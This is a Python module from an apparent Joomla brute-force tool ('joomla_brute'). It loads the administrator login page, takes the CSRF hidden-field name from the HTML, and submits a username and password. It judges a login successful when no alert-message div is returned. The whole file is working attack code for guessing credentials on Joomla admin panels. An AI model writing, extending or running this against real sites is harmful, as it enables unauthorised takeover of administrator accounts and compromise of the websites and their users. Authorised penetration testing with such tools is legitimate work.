"""CSRF extraction and Joomla administrator login attempts."""

from __future__ import annotations

import logging

import requests
from bs4 import BeautifulSoup

from joomla_brute.constants import OPTION, RETURN_B64, TASK, USER_AGENT
from joomla_brute.session import session_get, session_post

LOG = logging.getLogger(__name__)


def extract_csrf_field_name(html: str) -> str | None:
    soup = BeautifulSoup(html, "html.parser")
    hidden = soup.find_all("input", type="hidden")
    if not hidden:
        return None
    last = hidden[-1]
    name = last.get("name")
    if isinstance(name, str) and name:
        return name
    return None


def try_login(
    session: requests.Session,
    admin_url: str,
    username: str,
    password: str,
) -> bool:
    """Return True if login appears successful (no alert-message div)."""
    headers = {"User-Agent": USER_AGENT}
    r_get = session_get(session, admin_url, headers=headers)
    r_get.raise_for_status()
    token_name = extract_csrf_field_name(r_get.text)
    if not token_name:
        LOG.error("Could not parse CSRF hidden field from administrator login page")
        return False

    data = {
        "username": username,
        "passwd": password,
        "option": OPTION,
        "task": TASK,
        "return": RETURN_B64,
        token_name: 1,
    }
    r_post = session_post(session, admin_url, data=data, headers=headers)
    r_post.raise_for_status()
    soup = BeautifulSoup(r_post.text, "html.parser")
    alert = soup.find("div", class_="alert-message")
    return alert is None
